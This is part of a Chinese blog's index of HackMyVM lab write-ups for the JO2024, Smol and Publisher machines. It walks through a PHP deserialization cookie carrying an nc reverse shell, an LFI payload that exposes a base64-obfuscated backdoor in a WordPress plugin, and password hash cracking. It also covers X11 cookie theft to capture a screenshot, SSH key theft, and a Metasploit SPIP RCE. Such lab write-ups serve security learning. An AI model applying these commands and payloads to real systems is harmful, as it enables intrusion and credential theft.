text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Connection: keep-alive Cookie: preferences=TzoxNToiVXNlclByZWZlcmVuY2VzIjoyOntzOjg6Imxhbmd1YWdlIjtzOjI6ImZyIjtzOjE1OiJiYWNrZ3JvdW5kQ29sb3IiO3M6NDoiI2RkZCI7fQ%3D%3D Upgrade-Insecure-Requests: 1 cookie里面有preferences,这玩意其实是base64，没想到吧 O:15:\"UserPreferences\":2:{s:8:\"language\";s:2:\"fr\";s:15:\"backgroundColor\";s:4:\"#ddd\";} 看着像是序列化的东西，不确定，再试试，修改成O:15:\"UserPreferences\":2:{s:8:\"language\";s:6:\"whoami\";s:15:\"backgroundColor\";s:7:\"#DC143C\";}然后base64发过去，会得到Your language setting is whoami. ok，无敌了 O:15:\"UserPreferences\":2:{s:8:\"language\";s:33:\"nc 192.168.31.187 1234 -e /bin/sh\";s:15:\"backgroundColor\";s:4:\"#ddd\";} (注意点：s：后面的数字是字符串的长度,echo -n “nc 192.168.31.187 1234 -e /bin/sh” | wc -c是输出33) 这个时候就反弹shell成功了 ","date":"2025-03-07","objectID":"/hmv_jo2024/:1:3","tags":["渗透"],"title":"HMV JO2024","uri":"/hmv_jo2024/"},{"categories":["靶场"],"content":"提权 先python3 -c 'import pty; pty.spawn(\"/bin/bash\")'升级一下shell www-data@MiWiFi-R4CM-srv:/home/vanity$ ls -la ls -la total 76 drwxr-xr-x 10 vanity vanity 4096 Mar 7 12:44 . drwxr-xr-x 3 root root 4096 Jul 28 2024 .. -rw------- 1 vanity vanity 218 Mar 7 12:43 .Xauthority lrwxrwxrwx 1 root root 9 Jul 26 2024 .bash_history -\u003e /dev/null -rw-r--r-- 1 vanity vanity 220 Jul 29 2024 .bash_logout -rw-r--r-- 1 vanity vanity 3526 Jul 29 2024 .bashrc drwxr-xr-x 7 vanity vanity 4096 Jul 29 2024 .cache drwx------ 13 vanity vanity 4096 Jul 29 2024 .config -rw-r--r-- 1 vanity vanity 35 Jul 29 2024 .dmrc -rw------- 1 vanity vanity 36 Jul 29 2024 .lesshst drwxr-xr-x 3 vanity vanity 4096 Jul 29 2024 .local -rw-r--r-- 1 vanity vanity 807 Jul 29 2024 .profile drwx------ 2 vanity vanity 4096 Jul 29 2024 .ssh -rw-r--r-- 1 vanity vanity 8 Jul 29 2024 .xprofile drwxr-xr-x 2 vanity vanity 4096 Jul 29 2024 Desktop drwxr-xr-x 2 vanity vanity 4096 Jul 29 2024 Documents drwxr-xr-x 2 vanity vanity 4096 Jul 29 2024 Images -rwxr-xr-x 1 vanity vanity 557 Jul 29 2024 backup drwx------ 2 vanity vanity 4096 Jul 29 2024 creds -rwx------ 1 vanity vanity 33 Jul 29 2024 user.txt flag不让读wc，backup可以，看看 www-data@MiWiFi-R4CM-srv:/home/vanity$ cat backup cat backup #!/bin/bash SRC=\"/home/vanity\" DEST=\"/backup\" rm -rf /backup/{*,.*} echo \"Starting copy...\" find \"$SRC\" -maxdepth 1 -type f ! -name user.txt | while read srcfile; do destfile=\"$DEST${srcfile#$SRC}\" mkdir -p \"$(dirname \"$destfile\")\" dd if=\"$srcfile\" of=\"$destfile\" bs=4M md5src=$(md5sum \"$srcfile\" | cut -d ' ' -f1) md5dest=$(md5sum \"$destfile\" | cut -d ' ' -f1) if [[ \"$md5src\" != \"$md5dest\" ]]; then echo \"MD5 mismatch for $srcfile :(\" fi chmod 700 \"$destfile\" done echo \"Copy complete. All files verified !\" 这个脚本的主要功能是： 清空目标目录 /backup。 将 /home/vanity 目录中除了 user.txt 之外的所有文件复制到 /backup。 在复制过程中，校验文件的完整性，并设置目标文件的权限为 700。 如果文件复制后校验失败，输出错误信息。 漏洞点应该是在于dd命令，dd复制文件时不会保留原始文件的权限，而是使用目标文件的默认权限，并且可以是看到是在复制完毕后再使用chmod 700 \"$destfile\"去设置权限 我们目的是读取文件，那么我们就可以使用条件竞争在它修改文件权限前读到文件 www-data@jo2024:/$ while true; do cat /backup/.Xauthority \u003e\u003e /tmp/log 2\u003e/dev/null;sleep 0.01; done \u003cXauthority \u003e\u003e /tmp/log 2\u003e/dev/null;sleep 0.01; done 看看log www-data@jo2024:/$ cat /tmp/log cat /tmp/log debian11MIT-MAGIC-COOKIE-1\u003e7 EXJ[fdebian0MIT-MAGIC-COOKIE-1mlJ jo2024.hmv0MIT-MAGIC-COOKIE-1A6\u0026Xj*Zdebian11MIT-MAGIC-COOKIE-1\u003e7 利用 .Xauthority，在https://book.hacktricks.wiki/en/network-services-pentesting/6000-pentesting-x11.html#screenshots-capturing www-data@jo2024:/$ w 14:03:43 up 4:43, 1 user, load average: 0.44, 0.29, 0.14 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT vanity tty7 :0 09:20 4:43m 0.00s 0.07s /usr/bin/lxsession -s LXDE -e LXDE export XAUTHORITY=/tmp/log xwd -root -screen -silent -display :0 \u003e screenshot.xwd python3 -m http.server 2131(传到kali) convert screenshot.xwd screenshot.png 得到账号密码vanity/xd0oITR93KIQDbiD，那么ssh上去 vanity@MiWiFi-R4CM-srv:~$ sudo -l sudo: unable to resolve host MiWiFi-R4CM-srv: No address associated with hostname Matching Defaults entries for vanity on MiWiFi-R4CM-srv: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty User vanity may run the following commands on MiWiFi-R4CM-srv: (ALL : ALL) NOPASSWD: /usr/local/bin/php-server.sh vanity@MiWiFi-R4CM-srv:~$ cat /usr/local/bin/php-server.sh #!/bin/bash /usr/bin/php -t /opt -S 0.0.0.0:8000 好像是起了一个服务，启动访问一下 Olympic Athlete Password Leaked! A hacker claims to have obtained the password of a famous Olympic athlete. According to the hacker, he managed to hack into the personal account of the famous sprinter, Usain Bolt! The hacker has provided what he claims to be Usain Bolt's account password as proof of his achievement. For security reasons and to protect the athlete's privacy, the content below is blurred and requires a subscription to be revealed. 奥运会运动员密码泄漏了！ 一位黑客声称已经获得了著名奥运会运动员的密码。根据黑客的说法，他设法闯入了著名的短跑运动员Usain Bolt的个人帐户！ 黑客提供了他声称是Usain Bolt的帐户密码的证明，以证明他的成就。出于安全原因并保护运动员的隐私，下面的内容模糊不清，需要订阅以揭示。 f12看看隐藏的部分 data-content=\"As part o","date":"2025-03-07","objectID":"/hmv_jo2024/:1:4","tags":["渗透"],"title":"HMV JO2024","uri":"/hmv_jo2024/"},{"categories":["靶场"],"content":"Smol ","date":"2025-03-07","objectID":"/hmv_smol/:1:0","tags":["渗透"],"title":"HMV Smol","uri":"/hmv_smol/"},{"categories":["靶场"],"content":"靶场链接 https://hackmyvm.eu/machines/machine.php?vm=Smol ","date":"2025-03-07","objectID":"/hmv_smol/:1:1","tags":["渗透"],"title":"HMV Smol","uri":"/hmv_smol/"},{"categories":["靶场"],"content":"日常扫描 ┌──(parallels㉿kali-linux-2024-2)-[~] └─$ nmap -sC -sV 192.168.31.25 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-06 20:18 CST Nmap scan report for 192.168.31.25 Host is up (0.0023s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA) | 256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA) |_ 256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Did not follow redirect to http://www.smol.hmv Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 7.60 seconds 设置一下重定向，最下面有Proudly powered by WordPress | PopularFX Theme wpscan启动！ ┌──(parallels㉿kali-linux-2024-2)-[~] └─$ wpscan --url http://www.smol.hmv/ -e u,ap --plugins-detection aggressive _______________________________________________________________ __ _______ _____ \\ \\ / / __ \\ / ____| \\ \\ /\\ / /| |__) | (___ ___ __ _ _ __ ® \\ \\/ \\/ / | ___/ \\___ \\ / __|/ _` | '_ \\ \\ /\\ / | | ____) | (__| (_| | | | | \\/ \\/ |_| |_____/ \\___|\\__,_|_| |_| WordPress Security Scanner by the WPScan Team Version 3.8.25 Sponsored by Automattic - https://automattic.com/ @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart _______________________________________________________________ [+] URL: http://www.smol.hmv/ [192.168.31.25] [+] Started: Thu Mar 6 20:26:25 2025 Interesting Finding(s): [+] Headers | Interesting Entry: Server: Apache/2.4.41 (Ubuntu) | Found By: Headers (Passive Detection) | Confidence: 100% [+] XML-RPC seems to be enabled: http://www.smol.hmv/xmlrpc.php | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: | - http://codex.wordpress.org/XML-RPC_Pingback_API | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/ | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/ [+] WordPress readme found: http://www.smol.hmv/readme.html | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] Upload directory has listing enabled: http://www.smol.hmv/wp-content/uploads/ | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] The external WP-Cron seems to be enabled: http://www.smol.hmv/wp-cron.php | Found By: Direct Access (Aggressive Detection) | Confidence: 60% | References: | - https://www.iplocation.net/defend-wordpress-from-ddos | - https://github.com/wpscanteam/wpscan/issues/1299 [i] The WordPress version could not be detected. [+] WordPress theme in use: popularfx | Location: http://www.smol.hmv/wp-content/themes/popularfx/ | Last Updated: 2024-11-19T00:00:00.000Z | Readme: http://www.smol.hmv/wp-content/themes/popularfx/readme.txt | [!] The version is out of date, the latest version is 1.2.6 | Style URL: http://www.smol.hmv/wp-content/themes/popularfx/style.css?ver=1.2.5 | Style Name: PopularFX | Style URI: https://popularfx.com | Description: Lightweight theme to make beautiful websites with Pagelayer. Includes 100s of pre-made templates to ... | Author: Pagelayer | Author URI: https://pagelayer.com | | Found By: Css Style In Homepage (Passive Detection) | | Version: 1.2.5 (80% confidence) | Found By: Style (Passive Detection) | - http://www.smol.hmv/wp-content/themes/popularfx/style.css?ver=1.2.5, Match: 'Version: 1.2.5' [+] Checking Plugin Versions (via Passive and Aggressive Methods) [i] Plugin(s) Identified: [+] akismet | Location: http://www.smol.hmv/wp-content/plugins/akismet/ | Last Updated: 2025-02-14T18:49:00.000Z | Readme: http://www.smol.hmv/wp-c","date":"2025-03-07","objectID":"/hmv_smol/:1:2","tags":["渗透"],"title":"HMV Smol","uri":"/hmv_smol/"},{"categories":["靶场"],"content":"弹shell 额，发现这个用户权限很低（wp版本好低，看的不习惯都），插件不能编辑上传，主题源码不能修改，完啦 看里面的内容发现Webmaster Tasks!!有一句话[IMPORTANT] Check Backdoors: Verify the SOURCE CODE of \"Hello Dolly\" plugin as the site's code revision.，开扫 ┌──(parallels㉿kali-linux-2024-2)-[~] └─$ dirsearch -u \"http://www.smol.hmv/\" -x 403 -e php,zip,txt /usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html from pkg_resources import DistributionNotFound, VersionConflict _|. _ _ _ _ _ _|_ v0.4.3 (_||| _) (/_(_|| (_| ) Extensions: php, zip, txt | HTTP method: GET | Threads: 25 Wordlist size: 10439 Output File: /home/parallels/reports/http_www.smol.hmv/__25-03-06_20-43-25.txt Target: http://www.smol.hmv/ [20:43:25] Starting: [20:43:37] 301 - 0B - /index.php -\u003e http://www.smol.hmv/ [20:43:37] 200 - 7KB - /license.txt [20:43:37] 404 - 19KB - /index.php/login/ [20:43:42] 200 - 3KB - /readme.html [20:43:47] 301 - 315B - /wp-admin -\u003e http://www.smol.hmv/wp-admin/ [20:43:47] 301 - 317B - /wp-content -\u003e http://www.smol.hmv/wp-content/ [20:43:47] 200 - 0B - /wp-content/ [20:43:47] 200 - 84B - /wp-content/plugins/akismet/akismet.php [20:43:47] 500 - 0B - /wp-content/plugins/hello.php [20:43:47] 200 - 519B - /wp-content/uploads/ [20:43:47] 200 - 414B - /wp-content/upgrade/ [20:43:47] 301 - 318B - /wp-includes -\u003e http://www.smol.hmv/wp-includes/ [20:43:47] 200 - 0B - /wp-includes/rss-functions.php [20:43:48] 400 - 1B - /wp-admin/admin-ajax.php [20:43:48] 200 - 0B - /wp-cron.php [20:43:48] 409 - 3KB - /wp-admin/setup-config.php [20:43:48] 200 - 4KB - /wp-includes/ [20:43:48] 200 - 0B - /wp-config.php [20:43:48] 302 - 0B - /wp-admin/ -\u003e http://www.smol.hmv/wp-login.php?redirect_to=http%3A%2F%2Fwww.smol.hmv%2Fwp-admin%2F\u0026reauth=1 [20:43:48] 200 - 511B - /wp-admin/install.php [20:43:48] 302 - 0B - /wp-signup.php -\u003e http://www.smol.hmv/wp-login.php?action=register [20:43:48] 405 - 42B - /xmlrpc.php [20:43:48] 200 - 2KB - /wp-login.php Task Completed 再用一下poc /wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true\u0026call=getRawDataFromDatabase\u0026query=php://filter/resource=../../../../wp-content/plugins/hello.php 读取到 \u003c?php /** * @package Hello_Dolly * @version 1.7.2 */ /* Plugin Name: Hello Dolly Plugin URI: http://wordpress.org/plugins/hello-dolly/ Description: This is not just a plugin, it symbolizes the hope and enthusiasm of an entire generation summed up in two words sung most famously by Louis Armstrong: Hello, Dolly. When activated you will randomly see a lyric from \u003ccite\u003eHello, Dolly\u003c/cite\u003e in the upper right of your admin screen on every page. Author: Matt Mullenweg Version: 1.7.2 Author URI: http://ma.tt/ */ function hello_dolly_get_lyric() { /** These are the lyrics to Hello Dolly */ $lyrics = \"Hello, Dolly Well, hello, Dolly It's so nice to have you back where you belong You're lookin' swell, Dolly I can tell, Dolly You're still glowin', you're still crowin' You're still goin' strong I feel the room swayin' While the band's playin' One of our old favorite songs from way back when So, take her wrap, fellas Dolly, never go away again Hello, Dolly Well, hello, Dolly It's so nice to have you back where you belong You're lookin' swell, Dolly I can tell, Dolly You're still glowin', you're still crowin' You're still goin' strong I feel the room swayin' While the band's playin' One of our old favorite songs from way back when So, golly, gee, fellas Have a little faith in me, fellas Dolly, never go away Promise, you'll never go away Dolly'll never go away again\"; // Here we split it into lines. $lyrics = explode( \"\\n\", $lyrics ); // And then randomly choose a line. return wptexturize( $lyrics[ mt_rand( 0, count( $lyrics ) - 1 ) ] ); } // This just echoes the chosen line, we'll position it later. function hello_dolly() { eval(base64_decode('CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA=')); $chosen = hello_dolly_get_lyric(); $lang = ''; if ( 'e","date":"2025-03-07","objectID":"/hmv_smol/:1:3","tags":["渗透"],"title":"HMV Smol","uri":"/hmv_smol/"},{"categories":["靶场"],"content":"提权 进数据库查表 mysql\u003e select * from wp_users; select * from wp_users; +----+------------+------------------------------------+---------------+--------------------+---------------------+---------------------+---------------------+-------------+------------------------+ | ID | user_login | user_pass | user_nicename | user_email | user_url | user_registered | user_activation_key | user_status | display_name | +----+------------+------------------------------------+---------------+--------------------+---------------------+---------------------+---------------------+-------------+------------------------+ | 1 | admin | $P$B5Te3OJvzvJ7NjDDeHZcOKqsQACvOJ0 | admin | admin@smol.thm | http://www.smol.hmv | 2023-08-16 06:58:30 | | 0 | admin | | 2 | wpuser | $P$BfZjtJpXL9gBwzNjLMTnTvBVh2Z1/E. | wp | wp@smol.thm | http://smol.thm | 2023-08-16 11:04:07 | | 0 | wordpress user | | 3 | think | $P$B0jO/cdGOCZhlAJfPSqV2gVi2pb7Vd/ | think | josemlwdf@smol.thm | http://smol.thm | 2023-08-16 15:01:02 | | 0 | Jose Mario Llado Marti | | 4 | gege | $P$BsIY1w5krnhP3WvURMts0/M4FwiG0m1 | gege | gege@smol.thm | http://smol.thm | 2023-08-17 20:18:50 | | 0 | gege | | 5 | diego | $P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1 | diego | diego@smol.thm | http://smol.thm | 2023-08-17 20:19:15 | | 0 | diego | | 6 | xavi | $P$BvcalhsCfVILp2SgttADny40mqJZCN/ | xavi | xavi@smol.thm | http://smol.thm | 2023-08-17 20:20:01 | | 0 | xavi | +----+------------+------------------------------------+---------------+--------------------+---------------------+---------------------+---------------------+-------------+------------------------+ 6 rows in set (0.00 sec) 开爆密码 john --wordlist=/usr/share/wordlists/rockyou.txt hash Using default input encoding: UTF-8 Loaded 6 password hashes with 6 different salts (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3]) Cost 1 (iteration count) is 8192 for all loaded hashes Will run 8 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status sandiegocalifornia (?) su切换用户 diego@smol:/home$ cd think cd think diego@smol:/home/think$ ls ls diego@smol:/home/think$ ls -la ls -la total 32 drwxr-x--- 5 think internal 4096 Jan 12 2024 . drwxr-xr-x 6 root root 4096 Aug 16 2023 .. lrwxrwxrwx 1 root root 9 Jun 21 2023 .bash_history -\u003e /dev/null -rw-r--r-- 1 think think 220 Jun 2 2023 .bash_logout -rw-r--r-- 1 think think 3771 Jun 2 2023 .bashrc drwx------ 2 think think 4096 Jan 12 2024 .cache drwx------ 3 think think 4096 Aug 18 2023 .gnupg -rw-r--r-- 1 think think 807 Jun 2 2023 .profile drwxr-xr-x 2 think think 4096 Jun 21 2023 .ssh lrwxrwxrwx 1 root root 9 Aug 18 2023 .viminfo -\u003e /dev/null 别的账户还有意外之喜哎， diego@smol:/home/think/.ssh$ python3 -m http.server 8001 ┌──(parallels㉿kali-linux-2024-2)-[~/Desktop] └─$ wget 192.168.31.25:8001/id_rsa --2025-03-06 21:35:09-- http://192.168.31.25:8001/id_rsa Connecting to 192.168.31.25:8001... connected. HTTP request sent, awaiting response... 200 OK Length: 2602 (2.5K) [application/octet-stream] Saving to: ‘id_rsa’ id_rsa 100%[================\u003e] 2.54K --.-KB/s in 0.002s 2025-03-06 21:35:09 (1.39 MB/s) - ‘id_rsa’ saved [2602/2602] ┌──(parallels㉿kali-linux-2024-2)-[~/Desktop] └─$ chmod 600 id_rsa ┌──(parallels㉿kali-linux-2024-2)-[~/Desktop] └─$ ssh think@192.168.31.25 -i id_rsa Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-156-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Thu 06 Mar 2025 01:36:43 PM UTC System load: 1.46 Processes: 209 Usage of /: 56.1% of 9.75GB Users logged in: 0 Memory usage: 35% IPv4 address for enp0s17: 192.168.31.25 Swap usage: 0% Expanded Security Maintenance for Applications is not enabled. 162 updates can be applied immediately. 125 of these updates are standard security updates. To see these additional updates run: apt list --upgradable Enable ESM Apps to receive additional future security updates. See https://ubuntu.com/esm or run: sudo pro status The list of availab","date":"2025-03-07","objectID":"/hmv_smol/:1:4","tags":["渗透"],"title":"HMV Smol","uri":"/hmv_smol/"},{"categories":["靶场"],"content":"publisher ","date":"2025-03-05","objectID":"/hmv_publisher/:1:0","tags":["渗透"],"title":"HMV publisher","uri":"/hmv_publisher/"},{"categories":["靶场"],"content":"靶场链接 https://hackmyvm.eu/machines/machine.php?vm=Publisher ","date":"2025-03-05","objectID":"/hmv_publisher/:1:1","tags":["渗透"],"title":"HMV publisher","uri":"/hmv_publisher/"},{"categories":["靶场"],"content":"日常扫描 ip给了是 . . . 8 ┌──(kali㉿kali)-[~] └─$ nmap -sV -sC -T4 -Pn -p- 192.168.31.8 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-04 20:46 HKT Nmap scan report for 192.168.31.8 Host is up (0.0017s latency). Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA) | 256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA) |_ 256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Publisher's Pulse: SPIP Insights \u0026 Tips MAC Address: 08:00:27:E4:F1:F5 (Oracle VirtualBox virtual NIC) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 15.56 seconds dirb和dirsearch都扫不出来什么东西，换gobuster试试 ┌──(kali㉿kali)-[~] └─$ gobuster dir -u http://192.168.31.8/ -w /usr/share/wordlists/dirb/big.txt -x php,html,txt,md -b 404 =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://192.168.31.8/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirb/big.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Extensions: php,html,txt,md [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /.htpasswd (Status: 403) [Size: 277] /.htaccess.md (Status: 403) [Size: 277] /.htaccess.php (Status: 403) [Size: 277] /.htaccess.html (Status: 403) [Size: 277] /.htpasswd.md (Status: 403) [Size: 277] /.htaccess.txt (Status: 403) [Size: 277] /.htpasswd.php (Status: 403) [Size: 277] /.htpasswd.txt (Status: 403) [Size: 277] /.htpasswd.html (Status: 403) [Size: 277] /.htaccess (Status: 403) [Size: 277] /images (Status: 301) [Size: 313] [--\u003e http://192.168.31.8/images/] /index.html (Status: 200) [Size: 8686] /server-status (Status: 403) [Size: 277] /spip (Status: 301) [Size: 311] [--\u003e http://192.168.31.8/spip/] Progress: 102345 / 102350 (100.00%) =============================================================== Finished =============================================================== 好东西，怪不得那么多佬喜欢这个，spip好像有一堆漏洞，看看版本 ┌──(kali㉿kali)-[~] └─$ whatweb http://192.168.31.8/spip/ http://192.168.31.8/spip/ [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[192.168.31.8], MetaGenerator[SPIP 4.2.0], SPIP[4.2.0][http://192.168.31.8/spip/local/config.txt], Script[text/javascript], Title[Publisher], UncommonHeaders[composed-by,link,x-spip-cache] 找一下 ┌──(kali㉿kali)-[~] └─$ searchsploit SPIP 4.2.0 ---------------------------------------------- --------------------------------- Exploit Title | Path ---------------------------------------------- --------------------------------- SPIP v4.2.0 - Remote Code Execution (Unauthen | php/webapps/51536.py ---------------------------------------------- --------------------------------- Shellcodes: No Results ","date":"2025-03-05","objectID":"/hmv_publisher/:1:2","tags":["渗透"],"title":"HMV publisher","uri":"/hmv_publisher/"},{"categories":["靶场"],"content":"漏洞利用 脚本报错，不知道为啥，msf启动 msf6 \u003e search SPIP 4.2.0 [-] No results from search msf6 \u003e search SPIP 4.2 Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/multi/http/spip_bigup_unauth_rce 2024-09-06 excellent Yes SPIP BigUp Plugin Unauthenticated RCE 1 \\_ target: PHP In-Memory . . . . 2 \\_ target: Unix/Linux Command Shell . . . . 3 \\_ target: Windows Command Shell . . . . 4 exploit/multi/http/spip_porte_plume_previsu_rce 2024-08-16 excellent Yes SPIP Unauthenticated RCE via porte_plume Plugin 5 \\_ target: PHP In-Memory . . . . 6 \\_ target: Unix/Linux Command Shell . . . . 7 \\_ target: Windows Command Shell . . . . 8 exploit/multi/http/spip_rce_form 2023-02-27 excellent Yes SPIP form PHP Injection 9 \\_ target: PHP In-Memory . . . . 10 \\_ target: Unix/Linux Command Shell . . . . 11 \\_ target: Windows Command Shell . . . . Interact with a module by name or index. For example info 11, use 11 or use exploit/multi/http/spip_rce_form After interacting with a module you can manually set a TARGET with set TARGET 'Windows Command Shell' msf6 \u003e use 0 [*] No payload configured, defaulting to php/meterpreter/reverse_tcp msf6 exploit(multi/http/spip_bigup_unauth_rce) \u003e show options Module options (exploit/multi/http/spip_bigup_unauth_rce): Name Current Setting Required Description ---- --------------- -------- ----------- FORM_PAGE Auto yes A page with a form. Proxies no A proxy chain of format type:host:por t[,type:host:port][...] RHOSTS yes The target host(s), see https://docs. metasploit.com/docs/using-metasploit/ basics/using-metasploit.html RPORT 80 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connec tions TARGETURI / yes Path to Spip install VHOST no HTTP server virtual host Payload options (php/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 192.168.31.183 yes The listen address (an interface may be s pecified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 PHP In-Memory View the full module info with the info, or info -d command. msf6 exploit(multi/http/spip_bigup_unauth_rce) \u003e set RHOSTS http://192.168.31.8/spip/ RHOSTS =\u003e http://192.168.31.8/spip/ msf6 exploit(multi/http/spip_bigup_unauth_rce) \u003e run [*] Started reverse TCP handler on 192.168.31.183:4444 [*] Running automatic check (\"set AutoCheck false\" to disable) [*] SPIP Version detected: 4.2.0 [+] SPIP version 4.2.0 is vulnerable. [*] Bigup plugin version detected: 3.2.1 [+] The target appears to be vulnerable. Both the detected SPIP version (4.2.0) and bigup version (3.2.1) are vulnerable. [*] Found formulaire_action: login [*] Found formulaire_action_args: CKNCtMYqq36vgfpnNEIK0... [*] Preparing to send exploit payload to the target... [*] Sending stage (40004 bytes) to 192.168.31.8 [*] Meterpreter session 1 opened (192.168.31.183:4444 -\u003e 192.168.31.8:47312) at 2025-03-04 21:11:27 +0800 meterpreter \u003e shell Process 60 created. Channel 0 created. id uid=33(www-data) gid=33(www-data) groups=33(www-data) 这玩意真好用啊我靠，第一个flag可以直接拿到的 ","date":"2025-03-05","objectID":"/hmv_publisher/:1:3","tags":["渗透"],"title":"HMV publisher","uri":"/hmv_publisher/"},{"categories":["靶场"],"content":"提权 ls -la total 48 drwxr-xr-x 8 think think 4096 Feb 10 2024 . drwxr-xr-x 1 root root 4096 Dec 7 2023 .. lrwxrwxrwx 1 root root 9 Jun 21 2023 .bash_history -\u003e /dev/null -rw-r--r-- 1 think think 220 Nov 14 2023 .bash_logout -rw-r--r-- 1 think think 3771 Nov 14 2023 .bashrc drwx------ 2 think think 4096 Nov 14 2023 .cache drwx------ 3 think think 4096 Dec 8 2023 .config drwx------ 3 think think 4096 Feb 10 2024 .gnupg drwxrwxr-x 3 think think 4096 Jan 10 2024 .local -rw-r--r-- 1 think think 807 Nov 14 2023 .profile lrwxrwxrwx 1 think think 9 Feb 10 2024 .python_history -\u003e /dev/null drwxr-xr-x 2 think think 4096 Jan 10 2024 .ssh lrwxrwxrwx 1 think think 9 Feb 10 2024 .viminfo -\u003e /dev/null drwxr-x--- 5 www-data www-data 4096 Dec 20 2023 spip -rw-r--r-- 1 root root 35 Feb 10 2024 user.txt .ssh可以读，读密钥ssh上去 信息收集一下 think@publisher:~$ find / -perm -u=s -type f 2\u003e/dev/null /usr/lib/policykit-1/polkit-agent-helper-1 /usr/lib/openssh/ssh-keysign /usr/lib/eject/dmcrypt-get-device /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/xorg/Xorg.wrap /usr/sbin/pppd /usr/sbin/run_container /usr/bin/at /usr/bin/fusermount /usr/bin/gpasswd /usr/bin/chfn /usr/bin/sudo /usr/bin/chsh /usr/bin/passwd /usr/bin/mount /usr/bin/su /usr/bin/newgrp /usr/bin/pkexec /usr/bin/umount /usr/sbin/run_container这玩意有权限的，看看是什么，cat有乱码，strings看看 think@publisher:~$ strings /usr/sbin/run_container /lib64/ld-linux-x86-64.so.2 libc.so.6 __stack_chk_fail execve __cxa_finalize __libc_start_main GLIBC_2.2.5 GLIBC_2.4 _ITM_deregisterTMCloneTable __gmon_start__ _ITM_registerTMCloneTable u+UH []A\\A]A^A_ /bin/bash /opt/run_container.sh :*3$\" GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0 crtstuff.c deregister_tm_clones __do_global_dtors_aux completed.8061 __do_global_dtors_aux_fini_array_entry frame_dummy __frame_dummy_init_array_entry run_container.c __FRAME_END__ __init_array_end _DYNAMIC __init_array_start __GNU_EH_FRAME_HDR _GLOBAL_OFFSET_TABLE_ __libc_csu_fini _ITM_deregisterTMCloneTable _edata __stack_chk_fail@@GLIBC_2.4 __libc_start_main@@GLIBC_2.2.5 execve@@GLIBC_2.2.5 __data_start __gmon_start__ __dso_handle _IO_stdin_used __libc_csu_init __bss_start main __TMC_END__ _ITM_registerTMCloneTable __cxa_finalize@@GLIBC_2.2.5 .symtab .strtab .shstrtab .interp .note.gnu.property .note.gnu.build-id .note.ABI-tag .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rela.dyn .rela.plt .init .plt.got .plt.sec .text .fini .rodata .eh_frame_hdr .eh_frame .init_array .fini_array .dynamic 